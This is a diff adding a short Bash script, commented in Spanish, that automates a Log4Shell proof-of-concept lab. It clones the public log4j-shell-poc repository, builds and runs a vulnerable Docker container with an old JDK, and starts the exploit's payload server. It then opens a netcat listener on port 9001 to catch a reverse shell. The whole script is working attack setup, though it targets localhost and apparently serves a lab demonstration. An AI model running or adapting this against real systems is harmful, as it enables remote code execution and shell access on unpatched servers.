@@ -1,0 +1,31 @@
+#!/bin/bash
+
+# Clonar el repositorio
+git clone https://github.com/kozmer/log4j-shell-poc
+
+# Moverse al directorio clonado
+cd log4j-shell-poc
+
+# Instalar dependencias Python
+pip install -r requirements.txt
+
+# Extraer el archivo JDK (asumiendo que jdk-8u20-linux-x64.tar.gz está en el mismo directorio)
+tar -xf jdk-8u20-linux-x64.tar.gz
+
+# Construir la imagen de Docker
+sudo docker build -t log4j-shell-poc .
+
+# Ejecutar el contenedor Docker en una nueva terminal
+sudo gnome-terminal -- sudo docker run --network host log4j-shell-poc
+
+# Esperar unos segundos para que el contenedor Docker se inicie completamente
+sleep 5
+
+# Abrir una nueva terminal y ejecutar el script Python (de forma manual debemos enviar la carga util en el formulario)
+sudo gnome-terminal -- python3 poc.py --userip localhost --webport 8000 --lport 9001
+
+# Esperar unos segundos para que el script Python se inicie completamente
+sleep 2
+
+# iniciar netcat en modo de escucha en el puerto 9001
+sudo nc -lvnp 9001
